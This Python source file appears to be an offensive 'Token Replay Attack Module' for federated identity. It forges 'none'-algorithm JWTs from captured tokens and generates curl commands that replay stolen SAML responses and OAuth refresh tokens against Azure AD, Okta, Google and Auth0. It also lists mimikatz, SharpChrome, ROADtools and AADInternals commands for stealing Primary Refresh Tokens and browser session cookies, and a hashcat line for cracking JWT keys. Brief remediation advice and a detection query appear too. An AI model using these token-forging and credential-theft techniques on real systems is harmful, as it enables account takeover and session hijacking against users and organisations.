"""
Token Replay Attack Module

Token replay and abuse techniques for federated identity:
- SAML token replay
- OAuth token abuse
- JWT manipulation
- Session token hijacking
- Refresh token abuse
- PRT (Primary Refresh Token) attacks

MITRE ATT&CK:
- T1550.001: Use Alternate Authentication Material: Application Access Token
- T1528: Steal Application Access Token
- T1606.002: Forge Web Credentials: SAML Tokens
"""

import base64
import json
import time
import hashlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlparse


class TokenType(str, Enum):
    """Types of authentication tokens."""
    SAML_ASSERTION = "saml_assertion"
    SAML_RESPONSE = "saml_response"
    OAUTH_ACCESS_TOKEN = "oauth_access_token"
    OAUTH_REFRESH_TOKEN = "oauth_refresh_token"
    JWT = "jwt"
    SESSION_TOKEN = "session_token"
    PRT = "primary_refresh_token"
    KERB_TGT = "kerberos_tgt"
    KERB_ST = "kerberos_service_ticket"


class AttackResult(str, Enum):
    """Attack result status."""
    SUCCESS = "success"
    PARTIAL = "partial"
    FAILED = "failed"
    NOT_VULNERABLE = "not_vulnerable"


@dataclass
class TokenReplayFinding:
    """Finding from token replay analysis."""
    token_type: TokenType
    vulnerability: str
    description: str
    severity: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    exploitation: Dict[str, str] = field(default_factory=dict)
    mitre_technique: str = ""
    recommendation: str = ""


# =============================================================================
# Token Replay Techniques
# =============================================================================

TOKEN_REPLAY_TECHNIQUES = {
    "saml_replay": {
        "name": "SAML Token Replay",
        "description": "Replay valid SAML assertion before expiration",
        "severity": "high",
        "mitre": "T1550.001",
        "conditions": [
            "Valid SAML assertion captured",
            "NotOnOrAfter not yet reached",
            "No anti-replay protection",
        ],
        "detection": {
            "indicators": ["Same assertion ID used multiple times", "Same SubjectConfirmationData"],
        },
    },
    "oauth_refresh_abuse": {
        "name": "OAuth Refresh Token Abuse",
        "description": "Use stolen refresh token to obtain new access tokens",
        "severity": "critical",
        "mitre": "T1528",
        "conditions": [
            "Refresh token obtained",
            "Token not revoked",
            "Client credentials (optional)",
        ],
        "targets": ["Azure AD", "Okta", "Auth0", "Google"],
    },
    "jwt_none_algorithm": {
        "name": "JWT None Algorithm Attack",
        "description": "Modify JWT to use 'none' algorithm and bypass signature",
        "severity": "critical",
        "mitre": "T1550.001",
        "conditions": [
            "Server accepts 'none' algorithm",
            "Improper JWT validation",
        ],
    },
    "jwt_algorithm_confusion": {
        "name": "JWT Algorithm Confusion",
        "description": "Switch from RS256 to HS256 using public key as secret",
        "severity": "critical",
        "mitre": "T1550.001",
        "conditions": [
            "Server accepts both RS256 and HS256",
            "Public key is known",
        ],
    },
    "jwt_claim_injection": {
        "name": "JWT Claim Injection",
        "description": "Inject or modify claims in JWT payload",
        "severity": "high",
        "mitre": "T1550.001",
        "targets": ["role", "groups", "permissions", "email", "sub"],
    },
    "prt_abuse": {
        "name": "Primary Refresh Token Abuse",
        "description": "Abuse Azure AD PRT for persistent access",
        "severity": "critical",
        "mitre": "T1528",
        "tools": ["ROADtools", "AADInternals", "RequestAADRefreshToken"],
        "conditions": [
            "Device is Azure AD joined",
            "User session or PRT obtained",
        ],
    },
    "session_hijacking": {
        "name": "Session Token Hijacking",
        "description": "Hijack web application session tokens",
        "severity": "high",
        "mitre": "T1550.001",
        "methods": ["Cookie theft", "XSS", "Session fixation", "Network sniffing"],
    },
    "pass_the_cookie": {
        "name": "Pass the Cookie",
        "description": "Use stolen browser cookies to access applications",
        "severity": "high",
        "mitre": "T1550.001",
        "targets": ["Azure AD", "M365", "Okta", "AWS Console"],
    },
}


# =============================================================================
# OAuth Token Endpoints
# =============================================================================

OAUTH_ENDPOINTS = {
    "azure_ad": {
        "token": "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
        "authorize": "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize",
        "device_code": "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode",
        "refresh_scope": "offline_access",
    },
    "okta": {
        "token": "https://{domain}.okta.com/oauth2/v1/token",
        "authorize": "https://{domain}.okta.com/oauth2/v1/authorize",
    },
    "google": {
        "token": "https://oauth2.googleapis.com/token",
        "authorize": "https://accounts.google.com/o/oauth2/v2/auth",
    },
    "auth0": {
        "token": "https://{domain}.auth0.com/oauth/token",
        "authorize": "https://{domain}.auth0.com/authorize",
    },
}


class TokenReplayAttacks:
    """Token replay and abuse attack techniques."""
    
    def __init__(self, plugin_instance=None):
        self.plugin = plugin_instance
        self.findings: List[TokenReplayFinding] = []
    
    async def analyze_saml_token(
        self,
        saml_response: str,
    ) -> Dict[str, Any]:
        """
        Analyze SAML token for replay vulnerabilities.
        
        Args:
            saml_response: Base64-encoded SAML response
            
        Returns:
            Dict with analysis results
        """
        result = {
            "replayable": False,
            "vulnerabilities": [],
            "token_info": {},
            "exploitation": {},
        }
        
        try:
            # Decode SAML response
            decoded = base64.b64decode(saml_response).decode('utf-8')
            
            # Extract key fields
            import re
            
            # Check NotOnOrAfter
            not_on_or_after = re.search(r'NotOnOrAfter="([^"]+)"', decoded)
            if not_on_or_after:
                expiry = not_on_or_after.group(1)
                result["token_info"]["not_on_or_after"] = expiry
                
                # Check if still valid
                # (simplified - actual implementation would parse ISO8601)
                result["token_info"]["possibly_valid"] = True
            
            # Check for InResponseTo (anti-replay)
            in_response_to = re.search(r'InResponseTo="([^"]+)"', decoded)
            if in_response_to:
                result["token_info"]["in_response_to"] = in_response_to.group(1)
                result["vulnerabilities"].append("InResponseTo present - SP should validate")
            else:
                result["vulnerabilities"].append("No InResponseTo - IdP-initiated flow, potentially replayable")
                result["replayable"] = True
            
            # Check Assertion ID
            assertion_id = re.search(r'ID="([^"]+)"', decoded)
            if assertion_id:
                result["token_info"]["assertion_id"] = assertion_id.group(1)
            
            # Check Issuer
            issuer = re.search(r'<Issuer[^>]*>([^<]+)</Issuer>', decoded)
            if issuer:
                result["token_info"]["issuer"] = issuer.group(1)
            
            # Check for signature
            if '<ds:Signature' in decoded or '<Signature' in decoded:
                result["token_info"]["signed"] = True
            else:
                result["vulnerabilities"].append("Unsigned SAML response!")
                result["token_info"]["signed"] = False
            
            # Check Audience
            audience = re.search(r'<Audience>([^<]+)</Audience>', decoded)
            if audience:
                result["token_info"]["audience"] = audience.group(1)
            
            # Generate exploitation commands if replayable
            if result["replayable"]:
                result["exploitation"] = {
                    "method": "Replay SAML response to service provider",
                    "curl_example": f'''curl -X POST "https://{{SP_ACS_URL}}" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "SAMLResponse={saml_response}"''',
                    "burp_note": "Intercept login flow, replace SAMLResponse with captured token",
                }
                
                self.findings.append(TokenReplayFinding(
                    token_type=TokenType.SAML_RESPONSE,
                    vulnerability="SAML Token Replay",
                    description="SAML response can potentially be replayed",
                    severity="high",
                    evidence=result["token_info"],
                    exploitation=result["exploitation"],
                    mitre_technique="T1550.001",
                    recommendation="Implement assertion ID tracking; use InResponseTo validation",
                ))
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    async def analyze_jwt(
        self,
        token: str,
    ) -> Dict[str, Any]:
        """
        Analyze JWT for vulnerabilities.
        
        Args:
            token: JWT token string
            
        Returns:
            Dict with analysis results
        """
        result = {
            "vulnerabilities": [],
            "header": {},
            "payload": {},
            "attacks": [],
        }
        
        try:
            parts = token.split('.')
            if len(parts) != 3:
                result["error"] = "Invalid JWT format"
                return result
            
            # Decode header
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            result["header"] = header
            
            # Decode payload
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            result["payload"] = payload
            
            # Check algorithm
            alg = header.get("alg", "")
            
            if alg == "none":
                result["vulnerabilities"].append("Algorithm is 'none' - no signature verification!")
                result["attacks"].append({
                    "name": "None Algorithm",
                    "description": "JWT uses 'none' algorithm",
                    "severity": "critical",
                })
            
            if alg in ["HS256", "HS384", "HS512"]:
                result["vulnerabilities"].append("Symmetric algorithm - potential key brute force")
                result["attacks"].append({
                    "name": "HMAC Key Brute Force",
                    "description": "Try common secrets or brute force HMAC key",
                    "tools": ["jwt_tool", "hashcat"],
                    "command": "hashcat -a 0 -m 16500 jwt.txt wordlist.txt",
                })
            
            if alg in ["RS256", "RS384", "RS512"]:
                result["attacks"].append({
                    "name": "Algorithm Confusion",
                    "description": "Try changing to HS256 using public key as secret",
                    "condition": "Server accepts both RSA and HMAC algorithms",
                })
            
            # Check expiration
            exp = payload.get("exp")
            if exp:
                result["payload"]["exp_readable"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(exp))
                if exp > time.time():
                    result["valid_until"] = result["payload"]["exp_readable"]
                else:
                    result["expired"] = True
            else:
                result["vulnerabilities"].append("No expiration claim - token never expires!")
            
            # Check for sensitive claims
            sensitive_claims = ["role", "roles", "groups", "permissions", "admin", "is_admin"]
            for claim in sensitive_claims:
                if claim in payload:
                    result["attacks"].append({
                        "name": "Claim Manipulation",
                        "target_claim": claim,
                        "current_value": payload[claim],
                        "description": f"Try modifying '{claim}' claim for privilege escalation",
                    })
            
            # Generate None algorithm attack token
            none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
            none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            result["none_algorithm_token"] = f"{none_header}.{none_payload}."
            
            if result["vulnerabilities"]:
                self.findings.append(TokenReplayFinding(
                    token_type=TokenType.JWT,
                    vulnerability="JWT Vulnerabilities",
                    description="; ".join(result["vulnerabilities"]),
                    severity="high",
                    evidence={"header": header, "payload_claims": list(payload.keys())},
                    mitre_technique="T1550.001",
                    recommendation="Use strong algorithms (RS256); validate all claims; implement expiration",
                ))
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    async def oauth_refresh_token_abuse(
        self,
        provider: str,
        refresh_token: str,
        client_id: str,
        client_secret: str = None,
        tenant: str = None,
        domain: str = None,
    ) -> Dict[str, Any]:
        """
        Attempt to use refresh token to obtain new access token.
        
        Args:
            provider: OAuth provider (azure_ad, okta, google, auth0)
            refresh_token: Stolen refresh token
            client_id: Application client ID
            client_secret: Client secret (if required)
            tenant: Azure AD tenant (if azure_ad)
            domain: Domain for Okta/Auth0
            
        Returns:
            Dict with attack results
        """
        result = {
            "success": False,
            "access_token": None,
            "new_refresh_token": None,
            "error": None,
            "command": "",
        }
        
        endpoint_config = OAUTH_ENDPOINTS.get(provider)
        if not endpoint_config:
            result["error"] = f"Unknown provider: {provider}"
            return result
        
        # Build token endpoint URL
        token_url = endpoint_config["token"]
        if "{tenant}" in token_url and tenant:
            token_url = token_url.format(tenant=tenant)
        if "{domain}" in token_url and domain:
            token_url = token_url.format(domain=domain)
        
        # Build request
        data = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "client_id": client_id,
        }
        
        if client_secret:
            data["client_secret"] = client_secret
        
        # Generate curl command (for documentation)
        curl_data = " ".join([f'-d "{k}={v}"' for k, v in data.items()])
        result["command"] = f'curl -X POST "{token_url}" {curl_data}'
        
        # Actual attempt is a POST to the token endpoint.
        # Use the generated curl command above (kept as documentation) instead of embedding a python `requests` snippet.
        
        self.findings.append(TokenReplayFinding(
            token_type=TokenType.OAUTH_REFRESH_TOKEN,
            vulnerability="OAuth Refresh Token Abuse",
            description=f"Refresh token abuse attempted against {provider}",
            severity="critical",
            evidence={"provider": provider, "client_id": client_id},
            exploitation={"command": result["command"]},
            mitre_technique="T1528",
            recommendation="Implement refresh token rotation; monitor token usage; use conditional access",
        ))
        
        return result
    
    async def prt_attack_techniques(
        self,
    ) -> Dict[str, Any]:
        """
        Get Primary Refresh Token (PRT) attack techniques.
        
        Returns:
            Dict with PRT attack methods
        """
        return {
            "description": "Azure AD Primary Refresh Token attacks",
            "requirements": [
                "Azure AD joined or registered device",
                "User session or DPAPI access",
            ],
            "techniques": {
                "roadtools_prt": {
                    "name": "ROADtools PRT Extraction",
                    "description": "Extract PRT using ROADtools",
                    "commands": [
                        "# On compromised Azure AD joined device",
                        "roadrecon auth --prt-cookie",
                        "",
                        "# Use PRT to get tokens",
                        "roadrecon gather --tokens-stdout",
                    ],
                },
                "aadint_prt": {
                    "name": "AADInternals PRT Extraction",
                    "description": "Extract PRT using AADInternals PowerShell",
                    "commands": [
                        "# Export PRT",
                        "Export-AADIntLocalDeviceCertificate",
                        "Export-AADIntLocalDeviceTransportKey",
                        "",
                        "# Get new tokens using PRT",
                        "$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT",
                        "Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken",
                    ],
                },
                "mimikatz_prt": {
                    "name": "Mimikatz CloudAP",
                    "description": "Extract PRT using Mimikatz CloudAP module",
                    "commands": [
                        "# Dump CloudAP cache",
                        "mimikatz # sekurlsa::cloudap",
                        "",
                        "# Use derived key to decrypt PRT",
                    ],
                },
                "pass_the_prt": {
                    "name": "Pass the PRT",
                    "description": "Use extracted PRT from another device",
                    "commands": [
                        "# Inject PRT cookie into browser",
                        '# Cookie name: x-ms-RefreshTokenCredential',
                        '# Domain: login.microsoftonline.com',
                    ],
                },
            },
            "detection": {
                "indicators": [
                    "Unusual device ID in token request",
                    "PRT used from unexpected IP/location",
                    "Multiple token requests in short time",
                ],
                "azure_sentinel_query": """
SigninLogs
| where ResultType == 0
| where DeviceDetail.deviceId != ""
| summarize count() by DeviceDetail.deviceId, IPAddress
| where count_ > 10
""",
            },
            "mitre_technique": "T1528",
        }
    
    async def pass_the_cookie_attack(
        self,
        target: str,
    ) -> Dict[str, Any]:
        """
        Get pass-the-cookie attack techniques for target service.
        
        Args:
            target: Target service (azure_ad, m365, okta, aws)
            
        Returns:
            Dict with attack techniques
        """
        techniques = {
            "azure_ad": {
                "cookies": [
                    {"name": "ESTSAUTH", "description": "Azure AD session cookie"},
                    {"name": "ESTSAUTHPERSISTENT", "description": "Persistent Azure AD cookie"},
                    {"name": "x-ms-RefreshTokenCredential", "description": "PRT cookie"},
                ],
                "extraction": [
                    "# Chrome cookie extraction",
                    "SharpChrome.exe cookies /format:json",
                    "",
                    "# Firefox cookie extraction",
                    "python firefox_decrypt.py",
                    "",
                    "# Mimikatz DPAPI",
                    "mimikatz # dpapi::chrome /in:Cookies",
                ],
                "usage": [
                    "# Import cookies in browser",
                    "# Or use with requests library:",
                    "cookies = {'ESTSAUTH': 'cookie_value'}",
                    "curl -I -H \"Cookie: ESTSAUTH=cookie_value\" https://portal.azure.com",
                ],
            },
            "m365": {
                "cookies": [
                    {"name": "rtFa", "description": "SharePoint/OneDrive auth cookie"},
                    {"name": "FedAuth", "description": "SharePoint FedAuth cookie"},
                ],
                "extraction": "Same as Azure AD",
            },
            "okta": {
                "cookies": [
                    {"name": "sid", "description": "Okta session ID"},
                    {"name": "idx", "description": "Okta identity experience cookie"},
                ],
            },
            "aws": {
                "cookies": [
                    {"name": "aws-userInfo", "description": "AWS Console user info"},
                    {"name": "aws-creds", "description": "AWS temporary credentials"},
                ],
                "note": "AWS Console uses STS tokens which expire quickly",
            },
        }
        
        result = techniques.get(target, {"error": "Unknown target"})
        
        if target in techniques:
            self.findings.append(TokenReplayFinding(
                token_type=TokenType.SESSION_TOKEN,
                vulnerability="Pass the Cookie",
                description=f"Pass-the-cookie attack techniques for {target}",
                severity="high",
                evidence={"target": target, "cookies": result.get("cookies", [])},
                mitre_technique="T1550.001",
                recommendation="Implement session binding; use device compliance; monitor unusual access",
            ))
        
        return result
    
    async def generate_attack_report(self) -> Dict[str, Any]:
        """
        Generate comprehensive token attack report.
        
        Returns:
            Dict with all attack techniques and findings
        """
        return {
            "techniques": TOKEN_REPLAY_TECHNIQUES,
            "oauth_endpoints": OAUTH_ENDPOINTS,
            "findings": [
                {
                    "token_type": f.token_type.value,
                    "vulnerability": f.vulnerability,
                    "description": f.description,
                    "severity": f.severity,
                    "evidence": f.evidence,
                    "exploitation": f.exploitation,
                    "mitre_technique": f.mitre_technique,
                    "recommendation": f.recommendation,
                }
                for f in self.findings
            ],
            "prt_attacks": await self.prt_attack_techniques(),
            "recommendations": [
                "Implement token binding where possible",
                "Use short-lived access tokens",
                "Implement refresh token rotation",
                "Monitor for unusual token usage patterns",
                "Use Conditional Access policies",
                "Implement device compliance requirements",
                "Enable sign-in risk policies",
                "Use hardware security keys for sensitive accounts",
            ],
        }
    
    def get_findings(self) -> List[TokenReplayFinding]:
        """Get all findings."""
        return self.findings

